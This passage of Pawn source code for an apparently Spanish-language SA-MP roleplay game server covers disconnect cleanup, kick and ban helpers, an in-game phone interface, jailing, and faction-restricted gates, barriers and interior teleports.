		AutoLicenciaUsado[GetPVarInt(playerid, "LIC_VEH_INDEX")][GetPVarInt(playerid, "LIC_VEH_INDEX_2")] = false;
	}

	if(Specteado_Por[playerid] != INVALID_PLAYER_ID)
	{
		Mensaje(Specteado_Por[playerid] ,-1,"El jugador specteado, se desconectó.");
		cmd_dejarspec(Specteado_Por[playerid] ," ");
	}
	if(GetPVarInt(playerid,"ROBANDO"))
	{
	    MandarCarcel(playerid, 15, true);
	    new
	        MoneyStoled = GetPVarInt(playerid,"DINERO_ROBADO");
	        
	    QuitarDinero(playerid, MoneyStoled);
	    
	    new
	        neg = ID_Negocio(playerid);
	        
		if(0 <= neg <= MAX_NEGOCIOS)
	    	InfoNegocio[neg][nDinero] += MoneyStoled;
	}

	Loop(i, sizeof Camillas, 0) if(InfoCamilla[i][camiUsadaPor] == playerid)
	{
        InfoCamilla[i][camiUsadaPor] = INVALID_PLAYER_ID;
        KillTimer2(playerid, TIMER_CAMILLA);
	}

	new
	    Veh_CAMION = GetPVarInt(playerid, "Chofer_Camion");

	if(Veh_CAMION)
	{
	    VGas[Veh_CAMION] = 100;
		ClearString(InfoCamion[Veh_CAMION][camChofer]);
		InfoCamion[Veh_CAMION][camCarga] = 0;
		SetVehicleToRespawn(Veh_CAMION);
	}

	ActualizarCuenta(playerid);

	//Barras
	if(BExp[playerid] != INVALID_BAR_ID)
	{
	    DestroyProgressBar(BExp[playerid]);
		BExp[playerid] = INVALID_BAR_ID;
	}
	if(BHambre[playerid] != INVALID_BAR_ID)
	{
	    DestroyProgressBar(BHambre[playerid]);
		BHambre[playerid] = INVALID_BAR_ID;
	}
	if(BCansancio[playerid] != INVALID_BAR_ID)
	{
	    DestroyProgressBar(BCansancio[playerid]);
		BCansancio[playerid] = INVALID_BAR_ID;
	}
	if(BOrina[playerid] != INVALID_BAR_ID)
	{
	    DestroyProgressBar(BOrina[playerid]);
		BOrina[playerid] = INVALID_BAR_ID;
	}
	if(BMotor[playerid] != INVALID_BAR_ID)
	{
	    DestroyProgressBar(BMotor[playerid]);
		BMotor[playerid] = INVALID_BAR_ID;
	}
	if(BCombustible[playerid] != INVALID_BAR_ID)
	{
	    DestroyProgressBar(BCombustible[playerid]);
		BCombustible[playerid] = INVALID_BAR_ID;
	}
	if(BEstadoVeh[playerid] != INVALID_BAR_ID)
	{
	    DestroyProgressBar(BEstadoVeh[playerid]);
		BEstadoVeh[playerid] = INVALID_BAR_ID;
	}
	if(BCosecha[playerid] != INVALID_BAR_ID)
	{
	    DestroyProgressBar(BCosecha[playerid]);
		BCosecha[playerid] = INVALID_BAR_ID;
	}
	if(BarraGris[playerid] != PlayerText:INVALID_TEXT_DRAW)
	{
	    BarraGris[playerid] = PlayerText:INVALID_TEXT_DRAW;
	}
	return 1;
}



stock CongelarEx(playerid,segundos=0)
{
	if(!segundos) return TogglePlayerControllable(playerid,false);

	else if(segundos)
	{
		TogglePlayerControllable(playerid,false);
		SetTimerEx("Descongelar",segundos*1000,false,"i",playerid);
	}
	return 1;
}

stock TieneNumeros(str[])
{
	Loop(i,strlen(str),0)
	{
		if('0' <= str[i] <= '9') return 1;
	}
	return 0;
}

stock IlegalCharacterName(str[])
{
	static const IlegalC[] =
	{
		'0','1','2','3','4',
		'5','6','7','8','9',
		'[',']','$','(',')',
		'.', '-'
	};

	Loop(i, strlen(str),0)
	{
		Loop(c, sizeof IlegalC, 0)
		{
		    if(str[i] == IlegalC[c]) return true;
		}
	}
	return false;
}



stock IsNumeric(const string[])
{
    new length=strlen(string);
    if (length==0) return false;
    for (new i = 0; i < length; i++) {
        if (
        (string[i] > '9' || string[i] < '0' && string[i]!='-' && string[i]!='+')
        || (string[i]=='-' && i!=0)                                             //
        || (string[i]=='+' && i!=0)                                             //
        ) return false;
    }
    if (length==1 && (string[0]=='-' || string[0]=='+')) return false;
	return true;
}


stock _Kick(playerid,Quien[],Razon[])
{
	if(!IsPlayerConnected(playerid)) return 1;
 	new Str[80];
	MensajeTodosF(C_ROJO,"[ADMINISTRACIÓN] "#CBLANCO"> %s expulsó a %s. "#CROJO"[%s]",Quien,NombreJugador_(playerid),Razon);
	MensajeF(playerid,C_ROJO,"[ADMINISTRACIÓN] "#CBLANCO"> %s te expulsó "#CROJO"[%s].",Quien,Razon);
	A_Format(Str,"%s expulsó a %s - RAZON: [%s]",Quien,pName(playerid),Razon);
	Log("LOG/Expulsiones.txt",Str);
	CongelarEx(playerid);
	printf("KICK: `%s` | Kickeado por: %s | Razón: %s",pName(playerid),Quien,Razon);
	SetTimerEx("_KickEx2", 800, false, "i", playerid);
	return 1;
}

CALLBACK: _KickEx2(playerid)
	return Kick   (playerid);

stock _Ban(playerid,Quien[],Razon[], bool: SuperBan = false)
{
	if(!IsPlayerConnected(playerid)) return 1;
 	new Str[80];
 	if(!SuperBan)
 	{
 		MensajeTodosF(C_ROJO,"[ADMINISTRACIÓN] "#CBLANCO"> %s baneo a %s. "#CROJO"[%s]",Quien,pName(playerid),Razon);
		MensajeF(playerid,-1,"** %s te baneo "#CROJO"[%s].",Quien,Razon);
	}
	else
	{
 		MensajeTodosF(C_ROJO,"[ADMINISTRACIÓN] "#CBLANCO"> %s baneo completamente a %s. "#CROJO"[%s]",Quien,pName(playerid),Razon);
		MensajeF(playerid,-1,"** %s te baneo completamente "#CROJO"[%s].",Quien,Razon);
	}
	InfoJugador[playerid][jBaneado] = true;
	Mensaje(playerid,-1,"Si esto fue un error, saca una foto con el botón "#CINFO"[F8] "#CBLANCO"y subela al foro: "#CAZUL2""#FORO_SERVER"");
	if(SuperBan)
	{
		A_Format(Str,"%s super-baneó a %s - RAZON: [%s]",Quien,pName(playerid),Razon);
	}
	else
	{
		A_Format(Str,"%s baneó a %s - RAZON: [%s]",Quien,pName(playerid),Razon);
	}

	Log("LOG/Bans.txt",Str);
	CongelarEx(playerid);
	if(SuperBan)
	{
		printf("BAN: `%s` | SUPER-BANEADO por: %s | Razón: %s",pName(playerid),Quien,Razon);
		SerialBanPlayer(playerid, false);
	}
	else
	{
		printf("BAN: `%s` | Baneado por: %s | Razón: %s",pName(playerid),Quien,Razon);
	}
	SetTimerEx("_BanEx2", 800, false, "is", playerid, Razon);
	return 1;
}

CALLBACK:  _BanEx2(playerid, razon[])
	return  BanEx(playerid, razon);

stock FamiliaExiste(famid)
{
	return (InfoFamilia[famid][fPos_x] != 0.0) ? (true) : (false);
}

INI:Datos_generales[](name[], value[])
{
	INI_Int("Gente_online",Record_UsersOn);
	INI_Int("Data_0",UsersD_0);
	INI_Int("Data_1",UsersD_1);
	INI_Int("Data_2",UsersD_2);
	INI_Int("Tiempo_0",UsersT_0);
	INI_Int("Tiempo_1",UsersT_1);
	INI_Int("Tiempo_2",UsersT_2);
	INI_Int("Cuentas_Registradas",Cuentas_Registradas);
	INI_Int("Dinero_Banco",Dinero_Banco);
	return 0;
}

stock MostrarCelular(playerid,item)
{
	switch(item)
	{
	    case ID_MENUMARCAR:
	    {
			Loop(i,10,0) PlayerTextDrawHide(playerid,CelContactos[playerid][i]);
			Loop(i,4,0) TextDrawHideForPlayer(playerid,IconoCel[i]);
			Loop(i,10,0) TextDrawShowForPlayer(playerid,NumeroCel[i]);
			TextDrawHideForPlayer(playerid,VolverCel);
			TextDrawShowForPlayer(playerid,Llamar_Mensaje[0]);
			TextDrawShowForPlayer(playerid,Llamar_Mensaje[1]);
			TextDrawShowForPlayer(playerid,BorrarCel);
			Loop(i,7,0) TextDrawShowForPlayer(playerid,Celular[i]);
			new StrHora[10],Data[2];
			gettime(Data[0],Data[1]);
			A_Format(StrHora,"%02d:%02d",Data[0],Data[1]);
			TextDrawSetString(HoraCel,StrHora);
			TextDrawShowForPlayer(playerid,HoraCel);
			PlayerTextDrawSetString(playerid,Numero[playerid],"_");
			PlayerTextDrawShow(playerid,Numero[playerid]);
			SelectTextDraw(playerid,C_INFO);
		}
		case ID_MENUCEL:
		{
			Loop(i,10,0) PlayerTextDrawHide(playerid,CelContactos[playerid][i]);
			Loop(i,6,0) TextDrawShowForPlayer(playerid,Celular[i]);
			new StrHora[10],Data[2];
			gettime(Data[0],Data[1]);
			A_Format(StrHora,"%02d:%02d",Data[0],Data[1]);
			TextDrawSetString(HoraCel,StrHora);
			TextDrawShowForPlayer(playerid,HoraCel);
			SelectTextDraw(playerid,C_INFO);
			Loop(i,4,0) TextDrawShowForPlayer(playerid,IconoCel[i]);
			TextDrawShowForPlayer(playerid,VolverCel);
			PlayerTextDrawSetString(playerid,MenuCel[playerid],"Menu");
			PlayerTextDrawShow(playerid,MenuCel[playerid]);
		}
		case ID_MENUCONTACTOS:
		{
			Loop(i,4,0) TextDrawHideForPlayer(playerid,IconoCel[i]);
			Loop(i,6,0) TextDrawShowForPlayer(playerid,Celular[i]);
			new StrHora[10],Data[2];
			gettime(Data[0],Data[1]);
			A_Format(StrHora,"%02d:%02d",Data[0],Data[1]);
			TextDrawSetString(HoraCel,StrHora);
			TextDrawShowForPlayer(playerid,HoraCel);
			SelectTextDraw(playerid,C_INFO);
		    Loop(c,10,0)
			{
				PlayerTextDrawSetSelectable(playerid,CelContactos[playerid][c],true);
			}
			Loop(i,10,0)
			{
				PlayerTextDrawSetString(playerid,CelContactos[playerid][i],VerNombreContacto(playerid,i));
				PlayerTextDrawShow(playerid,CelContactos[playerid][i]);
			}
			TextDrawShowForPlayer(playerid,VolverCel);
			PlayerTextDrawSetString(playerid,MenuCel[playerid],"Contact.");
			PlayerTextDrawShow(playerid,MenuCel[playerid]);
		}
	}
	return 1;
}

stock SacarCelular(playerid)
{
	Loop(i,10,0) TextDrawHideForPlayer(playerid,NumeroCel[i]);
	TextDrawHideForPlayer(playerid,Llamar_Mensaje[0]);
	TextDrawHideForPlayer(playerid,Llamar_Mensaje[1]);
	TextDrawHideForPlayer(playerid,BorrarCel);
	Loop(i,7,0) TextDrawHideForPlayer(playerid,Celular[i]);
	TextDrawHideForPlayer(playerid,HoraCel);
	PlayerTextDrawHide(playerid,Numero[playerid]);
	CancelSelectTextDraw(playerid);
	Loop(i,4,0) TextDrawHideForPlayer(playerid,IconoCel[i]);
	TextDrawHideForPlayer(playerid,VolverCel);
	PlayerTextDrawHide(playerid,MenuCel[playerid]);
	Loop(i,10,0) PlayerTextDrawHide(playerid,CelContactos[playerid][i]);
	return 1;
}

stock GetGunObjectID(WeaponID)
{
    if (WeaponID < 0 || WeaponID > 64)
    {
        return 1575;
    }
    return GunObjectIDs[WeaponID];
}

stock ElegirRopa(playerid,skin)
{
	new Str[18 * MAX_ROPA],Ropa[MAX_ROPA][20],strI[20];
	Loop(i,MAX_ROPA,0)
	{
	    if(!InfoJugador[playerid][jRopa][i])
	    {
         	Ropa[i] = "Nada";
		}
		else
		{
			format(Ropa[i],20,"%d",InfoJugador[playerid][jRopa][i]);
		}
 		format(strI,sizeof(strI),"Slot %d ( %s )\n",i,Ropa[i]);
  		strins(Str,strI,strlen(Str));
	}
	Dialog(playerid,dElegirSRopa,DIALOG_STYLE_LIST,""#CBLANCO"Elige el slot para guardar esta ropa",Str,"Aceptar","");
	SetPVarInt(playerid,"ROPA_SELECCIONADA",skin);
	return 1;
}

stock MandarCarcel(playerid,mins,bool:adm = false)
{
	if(!adm)
	{
		SetPlayerPos(playerid,2530.9480,-1293.5564,1031.4219);
		SetPlayerInterior(playerid,2);
		InfoJugador[playerid][jTiempoCarcel] = mins*60;
		InfoJugador[playerid][jEncarcelado] = 1;
		KillTimer2(playerid,TIMER_CARCEL);
	 	Timer_Jugador[playerid][TIMER_CARCEL] = SetTimerEx("ActualizarTiempoCarcel",1000,true,"i",playerid);
		ResetPlayerWeapons(playerid);
		return 1;
	}
	else
	{
		SetPlayerPos(playerid,424.1288,-2481.9368,-27.9431);
		SetPlayerVirtualWorld(playerid, 5000+playerid);
		//SetPlayerWorldBounds(playerid,421.1088,-2484.9893,427.7379,-2478.2310);
		InfoJugador[playerid][jTiempoCarcel] = mins*60;
		InfoJugador[playerid][jEncarcelado] = 2;
		SetPlayerInterior(playerid, 0);
		KillTimer2(playerid,TIMER_CARCEL);
	 	Timer_Jugador[playerid][TIMER_CARCEL] = SetTimerEx("ActualizarTiempoCarcel",1000,true,"i",playerid);
		ResetPlayerWeapons(playerid);
		CongelarEx(playerid, 5);
		
		
		if(TextoCarcel[playerid] == PlayerText3D:INVALID_3DTEXT_ID)
		{
		    new
		        Txt[sizeof(TextoDeCarcel)];
		        
			strcat(Txt, TextoDeCarcel);
		    TextoCarcel[playerid] = CreatePlayer3DTextLabel(playerid, Txt, C_ROJO, 424.1288,-2481.9368,-27.9431, 4.0);
		}

		return 1;
	}
}

CALLBACK: Descongelar(playerid) return TogglePlayerControllable(playerid,true);

CALLBACK: ActivarArmasEnI() return AllowInteriorWeapons(true);

CALLBACK: T_VisitaCasa(playerid,idcasa)
{
	if(!IsPlayerConnected(playerid)) return 1;
	SetPlayerPos(playerid,InfoCasa[idcasa][cEntrada_x],InfoCasa[idcasa][cEntrada_y],InfoCasa[idcasa][cEntrada_z]);
	SetPlayerInterior(playerid,0);
	SetPlayerVirtualWorld(playerid,0);
	DeletePVar(playerid,"CASA_VISITA");
	Error(playerid,"Se te acabó el tiempo de visita.");
 	return 1;
}

CALLBACK: PlantandoBomba(playerid)
{
	if(!IsPlayerConnected(playerid)) return 1;
	cmd_do(playerid,"bomba plantada");
	Mensaje(playerid,-1,"La bomba fue plantada. Para detonarla, utiliza "#CINFO"(/detonar bomba)");
	return 1;
}


CALLBACK: DetonarDinamita(object, Float:x, Float:y, Float:z, bool: PuertaBanco)
{
	CreateExplosion(x, y, z, 0, 10.0);
	DestroyDynamicObject(object);
	if(PuertaBanco)
	{
		#if SISTEMA_BANCO == true
	    DestroyDynamicObject(OBJ_PuertaBanco);
	    #endif
	}

	return 1;
}


//Puertas
stock MoverObjeto(nombre,Float:X,Float:Y,Float:Z)
	MoveDynamicObject(nombre,X,Y,Z,3,-1000.0,-1000.0,-1000.0);


CALLBACK: PuertaLSPD()
{
	MoverObjeto(PLSPD1,CPLSPDC);
	MoverObjeto(PLSPD2,CPLSPDC2);
}

CALLBACK: AscensorLSPD()
{
	MoveDynamicObject(PALSPD1,253.10000610,109.69999695,1003.59997559,1,-1000.0,-1000.0,-1000.0);
	MoveDynamicObject(PALSPD2,253.09960938,108.50000000,1003.59997559,1,-1000.0,-1000.0,-1000.0);
}

CALLBACK: ComisariaLSPD()
	MoveDynamicObject(PCLSPD,239.60000610,118.09999847,1002.20001221,0.2,0.00000000,0.00000000,270.00000000);

CALLBACK: PuedePrecionar(playerid)
	DeletePVar(playerid,"TECLA_BLOQUEADA");

CALLBACK: ParkingCaligula1()
	MoveDynamicObject(BCASINO1,1213.69995117,-1841.90002441,15.19999981,4,0.00000000,0.00000000,180.00000000);

CALLBACK: ParkingCaligula2()
{
	MoveDynamicObject(BCASINO2,1269.40002441,-1842.69995117,15.19999981,4,0.00000000,0.00000000,179.99450684);
}

CALLBACK: CerrarCelda(i)
{
	MoveDynamicObject(OBJ_Carcel[i],PosCarcelesLSPD[i][0],PosCarcelesLSPD[i][1],PosCarcelesLSPD[i][2],1.0,-1000.0,-1000.0,-1000.0);
}

CALLBACK: BarreraLSMD1()
	RotarObjetoGlobal(BLSMD[0],0,270,0);

CALLBACK: BarreraGrotti()
	RotarObjetoGlobal(BGROTTI,90,0,300);

CALLBACK: BarreraLSMD2()
	RotarObjetoGlobal(BLSMD[1],0,270,0);

CALLBACK: PortonesLSMD()
{
	MoverObjeto(PLSMD[0],1141.40002441,-1292.09997559,13.69999981);
	MoverObjeto(PLSMD[1],1135.90002441,-1292.09997559,13.69999981);
}

CALLBACK: PortonLSTV1()
	MoverObjeto(PLSTV[0],778.00000000,-1384.90002441,13.1);

CALLBACK: PortonLSTV2()
	MoverObjeto(PLSTV[1],777.90002441,-1330.30004883,13);

CALLBACK: FuerzaAerea()
	MoverObjeto(PFUERZAAEREA,482.00000000,-2312.00000000,4.40000010);

CALLBACK: PortonGOB_0()
	MoverObjeto(PGOB[0],1264.59997559,-2048.30004883,60.90000153);

CALLBACK: PortonGOB_1()
	MoverObjeto(PGOB[1],1211.09997559,-2037.40002441,70.80000305);

CALLBACK: BarreraGOB()
	RotarObjetoGlobal(BGOB,0,270,0);

CALLBACK: BarreraDEPTOS()
	RotarObjetoGlobal(BDEPTOSG,0,270,0);

CALLBACK: PuertasCarcel()
{
	MoverObjeto(PCELDAS[0], 2565.63, -1300.40, 1030.42);
	MoverObjeto(PCELDAS[1], 2565.64, -1303.40, 1030.42);
}

CALLBACK: PortonHIT_0()
	MoverObjeto(PHITMAN[0], 282.7000122,-1542.4000244,25.3999996);

CALLBACK: PortonHIT_1()
	MoverObjeto(PHITMAN[1],321.2000122,-1488.3000488,25.3999996);


stock RotarObjetoGlobal(objid,Float:rx,Float:ry,Float:rz)
{
	new Float:PosOBJ[3];
	GetDynamicObjectPos(objid,PosOBJ[0],PosOBJ[1],PosOBJ[2]);
	MoveDynamicObject(objid,PosOBJ[0],PosOBJ[1],PosOBJ[2]+0.0005,0.0004,rx,ry,rz);
	return 1;
}

CALLBACK: PortonesAutomaticos(playerid)
{
	if(IsPlayerConnected(playerid))
	{
		if(GetPlayerInterior(playerid) == 2 && (EsLSPD(playerid) || EsMilitar(playerid)))
  		{
		    if(IsPlayerInRangeOfPoint(playerid,2,2565.64, -1303.40, 1030.42))
		    {
				if(GetPVarInt(playerid,"TECLA_BLOQUEADA")) return 0;
				SetTimer("PuertasCarcel",6000,0);
				SetTimerEx("PuedePrecionar",6500,0,"d",playerid);
	            AutoRol(playerid,"abre las puertas del depósito.");
				SetPVarInt(playerid,"TECLA_BLOQUEADA",1);
	 			MoverObjeto(PCELDAS[0],2565.63, -1299.08, 1030.42);
	 			MoverObjeto(PCELDAS[1],2565.64, -1304.72, 1030.42);
				return 1;
			}
         	Loop(i,sizeof PosCarcelesLSPD,0)
         	{
        	 	if(IsPlayerInRangeOfPoint(playerid,2,PosCarcelesLSPD[i][0],PosCarcelesLSPD[i][1],PosCarcelesLSPD[i][2]))
         		{
					if(GetPVarInt(playerid,"TECLA_BLOQUEADA")) return 0;
  					MoveDynamicObject(OBJ_Carcel[i],PosCarcelesLSPD[i][3],PosCarcelesLSPD[i][4],PosCarcelesLSPD[i][5],1.0,-1000.0,-1000.0,-1000.0);
					SetTimerEx("PuedePrecionar",3000,0,"d",playerid);
					SetTimerEx("CerrarCelda",4000,false,"i",i);
			 		AutoRol(playerid,"abre una celda con su llave.");
					SetPVarInt(playerid,"TECLA_BLOQUEADA",1);
				}
			}
		}
	    if(IsPlayerInRangeOfPoint(playerid,15,1209.90002441,-1291.69995117,13.19999981))
	    {
			if(GetPVarInt(playerid,"TECLA_BLOQUEADA")) return 0;
			SetTimer("BarreraLSMD1",6000,0);
			SetTimerEx("PuedePrecionar",6500,0,"d",playerid);
            AutoRol(playerid,"abre la barrera secundaria del hospital.");
			SetPVarInt(playerid,"TECLA_BLOQUEADA",1);
 			RotarObjetoGlobal(BLSMD[0],0,0,0);
			return 1;
		}
	    else if(IsPlayerInRangeOfPoint(playerid,15,1210.09997559,-1385.19995117,13.19999981))
	    {
			if(GetPVarInt(playerid,"TECLA_BLOQUEADA")) return 0;
			SetTimer("BarreraLSMD2",6000,0);
			SetTimerEx("PuedePrecionar",6500,0,"d",playerid);
            AutoRol(playerid,"abre la barrera del hospital.");
			SetPVarInt(playerid,"TECLA_BLOQUEADA",1);
			RotarObjetoGlobal(BLSMD[1],0,0,0);
			return 1;
		}
	    else if(IsPlayerInRangeOfPoint(playerid,15,558.90002441,-1255.69995117,17.00000000))
	    {
			if(GetPVarInt(playerid,"TECLA_BLOQUEADA") ) return 0;
			SetTimer("BarreraGrotti",6000,0);
			SetTimerEx("PuedePrecionar",6500,0,"d",playerid);
            AutoRol(playerid,"abre la barrera de grotti.");
			SetPVarInt(playerid,"TECLA_BLOQUEADA",1);
 			RotarObjetoGlobal(BGROTTI,18,0,296);
			return 1;
		}

	    else if(IsPlayerInRangeOfPoint(playerid,15,1135.90002441,-1292.09997559,13.69999981))
	    {
	        if(!EsMedico(playerid)) return 0;
			if(GetPVarInt(playerid,"TECLA_BLOQUEADA") ) return 0;
			SetTimer("PortonesLSMD",6000,0);
			SetTimerEx("PuedePrecionar",6500,0,"d",playerid);
            AutoRol(playerid,"abre los portones del hospital.");
			SetPVarInt(playerid,"TECLA_BLOQUEADA",1);
			MoverObjeto(PLSMD[0],1146.80004883,-1292.09997559,13.69999981);
			MoverObjeto(PLSMD[1],1130.40002441,-1292.09997559,13.69999981);
			return 1;

		}

		//LSTV
	    else if(IsPlayerInRangeOfPoint(playerid,15,778.00000000,-1384.90002441,13))
	    {
	        if(!EsReportero(playerid)) return 0;
			if(GetPVarInt(playerid,"TECLA_BLOQUEADA") ) return 0;
			SetTimer("PortonLSTV1",6000,0);
			SetTimerEx("PuedePrecionar",6500,0,"d",playerid);
            AutoRol(playerid,"abre el porton de LSTV.");
			SetPVarInt(playerid,"TECLA_BLOQUEADA",1);
			MoverObjeto(PLSTV[0],778.00000000,-1384.90002441,7);
			return 1;

		}

	    else if(IsPlayerInRangeOfPoint(playerid,15,777.90002441,-1330.30004883,13))
	    {
	        if(!EsReportero(playerid)) return 0;
			if(GetPVarInt(playerid,"TECLA_BLOQUEADA") ) return 0;
			SetTimer("PortonLSTV2",6000,0);
			SetTimerEx("PuedePrecionar",6500,0,"d",playerid);
            AutoRol(playerid,"abre el porton de LSTV.");
			SetPVarInt(playerid,"TECLA_BLOQUEADA",1);
			MoverObjeto(PLSTV[1],777.90002441,-1330.30004883,7);
			return 1;

		}
		// GOBIERNO
	    else if(IsPlayerInRangeOfPoint(playerid,15,1264.59997559,-2048.30004883,60.90000153))
	    {
	        if(!EsDelGobierno(playerid)) return 0;
			if(GetPVarInt(playerid,"TECLA_BLOQUEADA") ) return 0;
			SetTimer("PortonGOB_0",6000,0);
			SetTimerEx("PuedePrecionar",6500,0,"d",playerid);
            AutoRol(playerid,"abre el portón del gobierno.");
			SetPVarInt(playerid,"TECLA_BLOQUEADA",1);
			MoverObjeto(PGOB[0],1264.59997559,-2048.30004883,50.90000153);
			return 1;

		}

		// BARRERA DEPTOS GROOVE
	    else if(IsPlayerInRangeOfPoint(playerid,15,2188.96411133,-1776.94152832,13.17317390))
	    {
			if(GetPVarInt(playerid,"TECLA_BLOQUEADA") ) return 0;
			SetTimer("BarreraDEPTOS",6000,0);
			SetTimerEx("PuedePrecionar",6500,0,"d",playerid);
            AutoRol(playerid,"abre la barrera del complejo.");
			SetPVarInt(playerid,"TECLA_BLOQUEADA",1);
			RotarObjetoGlobal(BDEPTOSG,0,0,0);
			return 1;

		}


	    else if(IsPlayerInRangeOfPoint(playerid,15,1211.09997559,-2037.40002441,70.80000305))
	    {
	        if(!EsDelGobierno(playerid)) return 0;
			if(GetPVarInt(playerid,"TECLA_BLOQUEADA") ) return 0;
			SetTimer("PortonGOB_1",6000,0);
			SetTimerEx("PuedePrecionar",6500,0,"d",playerid);
            AutoRol(playerid,"abre el portón del gobierno.");
			SetPVarInt(playerid,"TECLA_BLOQUEADA",1);
			MoverObjeto(PGOB[1],1211.09997559,-2037.40002441,65.30000305);
			return 1;

		}

		// HITMAN
	    else if(IsPlayerInRangeOfPoint(playerid,15,282.7000122,-1542.4000244,25.3999996))
	    {
	        if(!EsHitman(playerid)) return 0;
			if(GetPVarInt(playerid,"TECLA_BLOQUEADA") ) return 0;
			SetTimer("PortonHIT_0",6000,0);
			SetTimerEx("PuedePrecionar",6500,0,"d",playerid);
            AutoRol(playerid,"abre el portón de hitman.");
			SetPVarInt(playerid,"TECLA_BLOQUEADA",1);
			MoverObjeto(PHITMAN[0],282.7000122,-1542.4000244,17.6000004);
			return 1;

		}

	    else if(IsPlayerInRangeOfPoint(playerid,15,321.2000122,-1488.3000488,25.3999996))
	    {
	        if(!EsHitman(playerid)) return 0;
			if(GetPVarInt(playerid,"TECLA_BLOQUEADA") ) return 0;
			SetTimer("PortonHIT_1",6000,0);
			SetTimerEx("PuedePrecionar",6500,0,"d",playerid);
            AutoRol(playerid,"abre el portón de hitman.");
			SetPVarInt(playerid,"TECLA_BLOQUEADA",1);
			MoverObjeto(PHITMAN[1],321.2000122,-1488.3000488,17.7000008);
			return 1;

		}

		//BARRERA GOBIERNO
	    else if(IsPlayerInRangeOfPoint(playerid,15,1430.900,-1883.19995,13.300))
	    {
			if(GetPVarInt(playerid,"TECLA_BLOQUEADA") ) return 0;
			SetTimer("BarreraGOB",6000,0);
			SetTimerEx("PuedePrecionar",6500,0,"d",playerid);
            AutoRol(playerid,"abre la barrera del gobierno.");
			SetPVarInt(playerid,"TECLA_BLOQUEADA",1);
			RotarObjetoGlobal(BGOB,0,352,358);
			return 1;

		}

	    else if(IsPlayerInRangeOfPoint(playerid,15,1548.69995117,-1625.09997559,14.39999962))//porton lspd
	    {
	        if(!EsLSPD(playerid)) return 0;
			if(GetPVarInt(playerid,"TECLA_BLOQUEADA") ) return 0;
			SetTimer("PuertaLSPD",6000,0);
			SetTimerEx("PuedePrecionar",6500,0,"d",playerid);
            AutoRol(playerid,"abre el porton de la policia mediante un control remoto.");
			SetPVarInt(playerid,"TECLA_BLOQUEADA",1);
			MoverObjeto(PLSPD1,CPLSPDA);
			MoverObjeto(PLSPD2,CPLSPDA2);
			return 1;
		}

	    else if(IsPlayerInRangeOfPoint(playerid,2,239.60000610,118.09999847,1002.20001221))//puerta lspd
	    {
	        if(!EsLSPD(playerid)) return 0;
			if(GetPVarInt(playerid,"TECLA_BLOQUEADA") ) return 0;
			SetTimer("ComisariaLSPD",3000,0);
			SetTimerEx("PuedePrecionar",3500,0,"d",playerid);
            AutoRol(playerid,"toma el picaporte y abre la puerta de la comisaria");
			SetPVarInt(playerid,"TECLA_BLOQUEADA",1);
			MoveDynamicObject(PCLSPD,239.69999695,118.00000000,1002.20001221,0.2,0.00000000,0.00000000,180.00000000);
			return 1;
		}
	    else if(IsPlayerInRangeOfPoint(playerid,15,1213.69995117,-1841.90002441,15.19999981))
	    {
			if(GetPVarInt(playerid,"TECLA_BLOQUEADA") ) return 0;
			if(GetPlayerMoney(playerid) < 100)
			{
			    MensajeF(playerid,C_NEGATIVO,"¡No tienes suficiente dinero! Te faltan $ %d",100-GetPlayerMoney(playerid));
   				return 1;
			}
			SetTimer("ParkingCaligula1",6000,0);
			SetTimerEx("PuedePrecionar",6500,0,"d",playerid);
			QuitarDinero(playerid,100);
            AutoRol(playerid,"paga la tarifa del parking ( $ 100 )");
			SetPVarInt(playerid,"TECLA_BLOQUEADA",1);
			MoveDynamicObject(BCASINO1,1213.69995117,-1842.30004883,18.00000000,4,90.00000000,180.00000000,359.99462891);
			return 1;
		}
	    else if(IsPlayerInRangeOfPoint(playerid,15,1269.40002441,-1842.69995117,15.19999981))
	    {
			if(GetPVarInt(playerid,"TECLA_BLOQUEADA") ) return 0;
			if(GetPlayerMoney(playerid) < 100)
			{
			    MensajeF(playerid,C_NEGATIVO,"¡No tienes suficiente dinero! Te faltan $ %d",100-GetPlayerMoney(playerid));
   				return 1;
			}
			SetTimer("ParkingCaligula2",6000,0);
			SetTimerEx("PuedePrecionar",6500,0,"d",playerid);
			QuitarDinero(playerid,100);
            AutoRol(playerid,"paga la tarifa del parking ( $ 100 )");
			SetPVarInt(playerid,"TECLA_BLOQUEADA",1);
			MoveDynamicObject(BCASINO2,1269.40002441,-1845.50000000,18.00000000,4,90.00000000,0.00000000,179.99450684);
			return 1;
		}
	    else if(IsPlayerInRangeOfPoint(playerid,15,482.00000000,-2312.00000000,4.40000010))//ejercito 1
	    {
	        if(!EsMilitar(playerid)) return 0;
			if(GetPVarInt(playerid,"TECLA_BLOQUEADA") ) return 0;
			SetTimer("FuerzaAerea",8000,0);
			SetTimerEx("PuedePrecionar",8500,0,"d",playerid);
            AutoRol(playerid,"abre la puerta del barco militar mediante un control remoto");
			SetPVarInt(playerid,"TECLA_BLOQUEADA",1);
			MoverObjeto(PFUERZAAEREA,482.00000000,-2312.00000000,-1.10000002);
			return 1;
		}
	}
	return 0;
}

CALLBACK: Interiores(playerid)
{
 	if(IsPlayerInRangeOfPoint(playerid,3,1268.1829,-835.9390,1044.965))//estudio de tv lstv
  	{
		SetPlayerPos(playerid,-152.3724, -287.5970, 1048.9722);
		CongelarEx(playerid, 3);
		return 1;
	}
 	else if(IsPlayerInRangeOfPoint(playerid,3,-152.3724, -287.5970, 1048.9722))//estudio de tv lstv
  	{//La vuelta
		SetPlayerPos(playerid,1268.1829,-835.9390,1044.965);
		CongelarEx(playerid, 3);
		return 1;
	}
 	else if(IsPlayerInRangeOfPoint(playerid,3,1524.4832,-1677.9523,6.2188))
  	{
		SetPlayerPos(playerid,252.4896,109.1263,1003.2188);
		SetPlayerInterior(playerid,10);
		return 1;
	}
	else if(IsPlayerInRangeOfPoint(playerid,3,1565.0422,-1685.4037,28.3956))
	{
		SetPlayerPos(playerid,252.4896,109.1263,1003.2188);
		SetPlayerInterior(playerid,10);
		return 1;
	}
	else if(IsPlayerInRangeOfPoint(playerid,3,270.39999390,113.09999847,1005))
	{
		SetPlayerPos(playerid,316.39999390,-170.10000610,999.79998779);
		SetPlayerInterior(playerid,6);
		return 1;
	}
	else if(IsPlayerInRangeOfPoint(playerid,3,316.39999390,-170.10000610,999.79998779))
	{
		SetPlayerPos(playerid,270.39999390,113.09999847,1005);
		SetPlayerInterior(playerid,10);
		return 1;
	}
	else if(IsPlayerInRangeOfPoint(playerid,3,1420.2460,1.7224,1002.3906))
	{//Salir de la licencia
		SetPlayerPos(playerid,-2029.6633,-119.0019,1035);
		SetPlayerInterior(playerid,3);
		return 1;
	}
	//ropero GOBIERNO
